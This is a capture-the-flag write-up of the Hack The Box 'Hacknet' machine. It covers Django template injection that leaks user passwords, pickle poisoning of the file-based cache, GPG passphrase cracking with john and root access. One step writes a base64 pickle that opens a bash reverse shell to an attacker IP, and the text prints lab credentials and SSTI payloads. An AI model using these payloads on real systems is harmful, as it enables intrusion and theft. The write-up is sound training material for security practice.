<div align=center>

# Hacknet Machine Write-up

[HTB Machine Certificate](https://labs.hackthebox.com/achievement/machine/2088593/727)
</div>

## Reconnaissance

1. **Starting with nmao, only ports 22 SSH and 80 HTTP are open.**
    ```bash
    ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.85 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && nmap -p$ports -sC -sV 10.10.11.85
    ```

    ```bash
    PORT STATE SERVICE VERSION
    22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
    | ssh-hostkey:
    | 256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
    |_ 256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
    80/tcp open http nginx 1.22.1
    |_http-title: Did not follow redirect to http://hacknet.htb/
    |_http-server-header: nginx/1.22.1
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
2. **When accessing the webpage two buttons are displayed, 'login' and 'sign up'. The wepage is a social network for hackers.** 

    Analyses with wappalyzer show that the application use python with django framework.

3. **Creatin a account and logging in, the dashboard was displayed contianing a side menu, username and photo and a area to create posts.**


## Exploitation

### Server Side Template Injection (SSTI)

4. **Exploring the dashboard some possibles attack vectors were found.**

    1. The post field. 
    2. Edit profile ('/profile/edit') is possible make upload of user photo, email, username, password and about.
    3. Send a message to other users.
    4. In Messages ('/messages') a URl param was found when click in 'Sent' button ('/messages?tab=sent') and it allow see send messages. 
    5. In Explore ('/explore') many posts available, can have some information, and it's possible like and comment. 
    6. In Explore ('/explore') another URL param was found '/explore?page=3'.
    7. Also is possible add a user like contact, send a request contact. In this request the url also have two params. '/contacts?action=request&userId=19'.     
    8. The messages also are send using the ID, however not by param. '/message/send/19'.
    9. /contacts?action=delete&userId=27
       

    Some payload inserted in username field and some parameters caused status code 500, sign that it is vulnerable to SSTI. 
    
    There is a size limit on the username, and it also throws a 500 error when exceeded.
    - `username: {{ messages.storages.0.signer.key }}`
    - `/contacts?action=request&amp;userId={{7*7}}`
    - `/contacts?action={{7*7}}&amp;userId=19`

   
5. **Django has its own template engine, Django Template Language (DTL), which normally the engine used in Django applications. DTL does not directly run arbitrary Python. It only provide filters, tags and allowed variables.**

    Variables are used to show context values passed from the view to the template engine. They are encapsulated in `{{ }}`.

    **Example**: {{ user.name }} show the name attribute of user object. 
    
    The HTML page code contained {{ user }} inside ```<h2>```, ```<h3>``` or ```<h4>``` tags, indicating that these inputs were not processed by template engine and were sent as plain text. Nonetheless, when analyzing the post `likes` functionality, it was observed that the interface shows only the photos, however by analyzing the HTML code, the username was found inside `title` attribute of an `<img>` tag.

    ![][image1]

    ```html
    <div class="likes-review-item"><a href="/profile/2"><img src="/media/2.jpg" title="hexhunter"></a></div>
    <div class="likes-review-item"><a href="/profile/3"><img src="/media/3.jpg" title="rootbreaker"></a></div>
    <div class="likes-review-item"><a href="/profile/4"><img src="/media/4.jpg" title="zero_day"></a></div>
    <!-- <SNIP> -->
    ```

    Upon testing with {{ user }} as the username value, it was observed that it was processed by template engine, since `AnonymousUser` appeared in the `title` attribute value.
    

    ![][image2]

    ```html
    <div class="likes-review-item"><a href="/profile/27"><img src="/media/profile.png" title="AnonymousUser"></a></div>
     ```

    Attempt some template payloads: 
    - {{ user.username }} retun enpty.  
    - {{ user.password }} retun enpty.       
    - with () or [] retorna "Something went wrong...".
    
    ```html
    <div class="likes-review-item"><a>Something went wrong...</a></div> 
    ```

    ![][image3]

6. **It was necessary to learn about templates in the Django framework. I wrote this material compiling what was learned: <a href="https://lucasvmarangoni.medium.com/ssti-django-querysets-9de55c46cd1a">ssti-django-querysets</a>.**

    
    In summary, Django has a functionality called QuerySet, which is an Object returned by the model manager that represents a database query through the Django's native ORM. It's possible define the key under which this QuerySet will be exposed to the template. The `users` key is a common convention used by developers to access user data. 
    
7. **When trying {{ users }} this reveals is a QuerySet**
    
    ```html
     <!-- <SNIP> -->
    <div class="likes-review-item"><a href="/profile/24"><img src="/media/24.jpg" title="brute_force"></a></div>
    <div class="likes-review-item"><a href="/profile/40"><img src="/media/profile.png" title="
                &lt;QuerySet [
                &lt;SocialUser: hexhunter&gt;, 
                &lt;SocialUser: rootbreaker&gt;, 
                &lt;SocialUser: netninja&gt;, 
                &lt;SocialUser: shadowmancer&gt;, 
                &lt;SocialUser: stealth_hawk&gt;, 
                &lt;SocialUser: virus_viper&gt;, 
                &lt;SocialUser: brute_force&gt;, 
                &lt;SocialUser: {{ users }} &gt;]&gt;"></a>
    </div>
    ```

    Then, was attempt {{ users.values }} and successfull obteined all users data.

    ```html
    <!-- <SNIP> -->
    <div class="likes-review-item"><a href="/profile/24"><img src="/media/24.jpg" title="brute_force"></a></div>
    <div class="likes-review-item"><a href="/profile/40"><img src="/media/profile.png"
                title="&lt;QuerySet [{  
                    &#x27;id
                    &#x27;: 2, 
                    &#x27;email
                    &#x27;: 
                    &#x27;hexhunter@ciphermail.com
                    &#x27;, 
                    &#x27;username
                    &#x27;: 
                    &#x27;hexhunter
                    &#x27;, 
                    &#x27;password
                    &#x27;: 
                    &#x27;H3xHunt3r!
                    &#x27;, 
                    &#x27;picture
                    &#x27;: 
                    &#x27;2.jpg
                    &#x27;, 
                    &#x27;about
                    &#x27;: 
                    &#x27;A seasoned reverse engineer specializing in binary exploitation. Loves diving into hex editors and uncovering hidden data.
                   <!-- <SNIP> -->                   
    
    ```

    The users exposed are only those who liked the respective post. It only displays what the view put in the context. 


### Looking for sensitive information

8. **Initially the cross-users messages were analyzed while searching for sensitive information such as credentials.** 

    During this process, a user named `deepdive` using an email `@hacknet.htb` was found. The credentials for this user were found in `http://hacknet.htb/likes/15`.

    * An attempt was made to gain SSH access using `deepdive` credentials, however, it was unsuccessful. 

    This same user had received a message from a single user named `backdoor_bandit`. The message content caught attention: `"Cool. If anything goes wrong, ping me immediately."` This message requested that `deepdive` ping to him if something went wrong. 
    
    ![][image4]
    
9. **While analyzing the users credentials already obtained for backdoor_bandit's credentials was observed that his credentials had not been found.**

    Therefore, with the objective of obtaining backdoor_bandit's credentials a new search was started. On the likes page `http://hacknet.htb/likes/23`, a post made by `deepdive` user, a single backdoor_bandit's like was found.     
    
    
     ![][image5]
    
    
    The backdoor_bandit's email also is with `@hacknet.htb`.

        id:18, 
        email:mikey@hacknet.htb, 
        username: backdoor_bandit, 
        password: mYd4rks1dEisH3re

## Initial Access

10. **An attempt was made to gain SSH access using `backdoor_bandit` credentials, and this time it was successful.** 

### Post-exploration

11. **Initial Checks**  

    ```bash     
    mikey@hacknet:~$ id
    uid=1000(mikey) gid=1000(mikey) groups=1000(mikey)
    mikey@hacknet:~$ ls /home
    mikey  sandy
    ```

    There was a MySQL file in the home directory of the `mikey` user.

    ```bash
    lrwxrwxrwx 1 root  root        9 Aug  8  2024 .mysql_history -> /dev/null
    ```

    Analyzing the application directory.

    ```bash
    ls -l /var/www/HackNet
    total 24
    drwxr-xr-x 2 sandy sandy    4096 Dec 29  2024 backups
    -rw-r--r-- 1 sandy www-data    0 Aug  8  2024 db.sqlite3
    drwxr-xr-x 3 sandy sandy    4096 Sep  8 05:20 HackNet
    -rwxr-xr-x 1 sandy sandy     664 May 31  2024 manage.py
    drwxr-xr-x 2 sandy sandy    4096 Aug  8  2024 media
    drwxr-xr-x 6 sandy sandy    4096 Sep  8 05:22 SocialNetwork
    drwxr-xr-x 3 sandy sandy    4096 May 31  2024 static
    ```
    ```bash
    ```    

12. **The `db.sqlite3` file was copied to the attacker machine to access its contents. However it was empty.**

    ```bash
    scp mikey@10.10.11.85:/var/www/HackNet/db.sqlite3 ./
    ```

    ```bash
    sqlite3 db.sqlite3
    SQLite version 3.45.1 2024-01-30 16:01:20
    Enter ".help" for usage hints.
    sqlite> .databases;
    Error: unknown command or invalid arguments:  "databases;". Enter ".help" for help
    sqlite> .databases
    main: /home/lucas/workspace/htb-machines/HackNet/db.sqlite3 r/w
    sqlite> .tables
    sqlite> 
    ```

12. **Backup files were found, but the current user did not have permission and no keys were found for `mikey` user.**

    ```bash
    gpg --decrypt backup01.sql.gpg > backups/backup01.sql
    -bash: backups/backup01.sql: Permission denied
    ```
13. **Sandy's MySQL database credentials were found in `/var/www/HackNet/HackNet/settings.py`.**

    ```python
    <SNIP>

    SECRET_KEY = 'agyasdf&^F&ADf87AF*Df9A5D^AS%D6DflglLADIuhldfa7w'

    <SNIP>

    WSGI_APPLICATION = 'HackNet.wsgi.application'

    DATABASES = {
        'default': {
            'ENGINE': 'django.db.backends.mysql',
            'NAME': 'hacknet',
            'USER': 'sandy',
            'PASSWORD': 'h@ckn3tDBpa$$',
            'HOST':'localhost',
            'PORT':'3306',
        }
    }

    <SNIP>
    ```
    
    These credentials only provide access to the database and do not work for system access.

14. **Exploring the database with `sandy's` credentials.**
    ```bash
    mikey@hacknet:/var/www/HackNet/HackNet$ mysql -u sandy -p
    Enter password: 
    Welcome to the MariaDB monitor.  Commands end with ; or \g.
    Your MariaDB connection id is 531
    Server version: 10.11.11-MariaDB-0+deb12u1 Debian 12

    Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

    MariaDB [(none)]> 
    ```

    Only a single user was found in the `auth_user` database, however it was not possible to crack the hash.

    ```bash
    MariaDB [hacknet]> select * from auth_user;
    +----+------------------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+-------+----------+-----------+----------------------------+
    | id | password                                                                                 | last_login                 | is_superuser | username | first_name | last_name | email | is_staff | is_active | date_joined                |
    +----+------------------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+-------+----------+-----------+----------------------------+
    |  1 | pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ= | 2025-02-05 17:01:02.503833 |            1 | admin    |            |           |       |        1 |         1 | 2024-08-08 18:17:54.472758 |
    +----+------------------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+-------+----------+-----------+----------------------------+
    1 row in set (0.000 sec)
    MariaDB [(none)]> 
    ```
    
15. **Analyzing the `view.py` file in `/var/www/HackNet/SocialNetwork/view.py`.**

    The vulnerable SSTI function.
    ```python
    def likes(request, pk):
    if not "email" in request.session.keys():
        return redirect("index")

    session_user = get_object_or_404(SocialUser, email=request.session['email'])
    post = get_object_or_404(SocialArticle,pk=pk)
    users = post.likes.all()

    engine = engines["django"]
    template_string = ""

    context = {"users": users}

    for user in users:
        if not user.is_hidden or user == session_user:
            template_string += "<div class=\"likes-review-item\"><a href=\"/profile/"+str(user.pk)+"\"><img src=\""+user.picture.url+"\" title=\""+user.username+"\"></a></div>"

    try:
        template = engine.from_string(template_string)
    except:
        template = engine.from_string("<div class=\"likes-review-item\"><a>Something went wrong...</a></div>")

    return HttpResponse(template.render(context, request))
    ```

    The `explore` function caches its results for 60 seconds.

    ```python
    @cache_page(60)
    def explore(request):
    ```

    In the settings.py file, the cache configuration is defined and is stored in `/var/tmp/django_cache`.

    ```python
    CACHES = {
        'default': {
            'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
            'LOCATION': '/var/tmp/django_cache',
            'TIMEOUT': 60,
            'OPTIONS': {'MAX_ENTRIES': 1000},
        }
    }
    ```
    All responses cached by `@cache_page(60)`  are stored as file in `/var/tmp/django_cache`, using the `FileBasedCache` cache method.

    This backend does not interpret code. It only serializes the Python object (in the case of `cache_page`, the already rendered HTML) and writes it to disk. When the view is called again within of 60 seconds, it reads this file and returns the response without calling the view.

    The cache is generated the first time someone access the view.

    The backend `FileBasedCache` stores the responses as pickles Python (binary serialization).

    A request was then made to Gemini to search vulnerabilities related to "Django FileBasedCache. This method was found: https://notes.subh.space/linux-privilege-escalation/django-cache-rce.

 
    This confirms the hypothesis that creating a cache file with payload could be executed by the application and lead to escalated to the `sandy` user.

## Privilege Escalation 

16. **This confirms the hypothesis that creating a cache file with payload could be executed by the application and lead to escalated to the `sandy` user.**


    ```bash
    for i in $(ls *.djcache); do (rm -f $i; echo 'gASVTQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE2LzQ0MyAwPiYxJ5SFlFKULg==' | base64 -d > $i); done
    ```

    ![][image6]

### Post-exploration

17. **At this moment, and attempt dwas made to decrypt the previously backup files, and the error `'No secret key'` was displayed, even after confirming that `sandy` had a key.**

    ```bash 
    <SNIP>
    gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
    gpg: decryption failed: No secret key
    ``` 

    ```bash 
    sandy@hacknet:/var/www/HackNet$ gpg --list-secret-keys
    gpg --list-secret-keys
    /home/sandy/.gnupg/pubring.kbx
    ------------------------------
    sec   rsa1024 2024-12-29 [SC]
        21395E17872E64F474BF80F1D72E5C1FA19C12F7
    uid           [ultimate] Sandy (My key for backups) <sandy@hacknet.htb>
    ssb   rsa1024 2024-12-29 [E]
    ``` 

    Then, the private key was found and imported to try resolve this.

    ```bash 
    sandy@hacknet:/var/www/HackNet$ ls -la /home/sandy/.gnupg/private-keys-v1.d/
    ls -la /home/sandy/.gnupg/private-keys-v1.d/
    total 20
    drwx------ 2 sandy sandy 4096 Sep  5 11:33 .
    drwx------ 4 sandy sandy 4096 Sep 21 05:38 ..
    -rw------- 1 sandy sandy 1255 Sep  5 11:33 0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
    -rw------- 1 sandy sandy 2088 Sep  5 11:33 armored_key.asc
    -rw------- 1 sandy sandy 1255 Sep  5 11:33 EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
    ``` 

    * `gpg --import /home/sandy/.gnupg/private-keys-v1.d/armored_key.asc`    
    * `gpg --output /tmp/.ldk/backup01.sql --decrypt backups/backup01.sql.gpg`

    The same error persist.

18. **Learning more about `gpg`, it was discovered that it could be protected by a password and that this password is not requested via terminal, but rather through the GUI. This was confirmed.** 
    
    ```bash
    sandy@hacknet:~/.gnupg/private-keys-v1.d$ gpg --list-packets armored_key.asc
    <SNIP>
    iter+salt S2K, algo: 7, SHA1 protection, hash: 2, salt: 850FFB6E35F0058B
    skey[2]: [v4 protected]
    <SNIP>
    ```

    This means that it is possible to crack the `armored_key.asc` file to obtain its password.

## Privilege Escalation


19. **The files were copied to the attacker machine, and it was confirmed that when attempt to import them, a password was requested.**


    ![][image7]

    ```bash
    lucas@hacking:~/workspace/htb-machines/HackNet$ gpg2john armored_key.asc > hash
    File armored_key.asc
    lucas@hacking:~/workspace/htb-machines/HackNet/john-jumbo/run$ ./john --wordlist=../../../../wordlists/rockyou.txt ../../hash
    Using default input encoding: UTF-8
    Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
    Cost 1 (s2k-count) is 65011712 for all loaded hashes
    Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
    Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
    Will run 14 OpenMP threads
    Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
    sweetheart       (Sandy)     
    1g 0:00:00:01 DONE (2025-09-21 04:06) 0.7463g/s 323.9p/s 323.9c/s 323.9C/s 246810..leonardo
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    ```

    ![][image8]

20. **After decrypting all database backup files, keywords were searched while reviewing their contents, and in the `backup02.sql` file the `root` password was found within a user conversation (messages).**

    ![][image9]

## Root

21. **Root access was obtained.**

    ![][image10]



[image10]: files/htb-hacknet-machine/image10.png
[image9]: files/htb-hacknet-machine/image9.png
[image8]: files/htb-hacknet-machine/image8.png
[image7]: files/htb-hacknet-machine/image7.png
[image6]: files/htb-hacknet-machine/image6.png
[image5]: files/htb-hacknet-machine/image5.png
[image4]: files/htb-hacknet-machine/image4.png
[image3]: files/htb-hacknet-machine/image3.png
[image2]: files/htb-hacknet-machine/image2.png
[image1]: files/htb-hacknet-machine/image1.png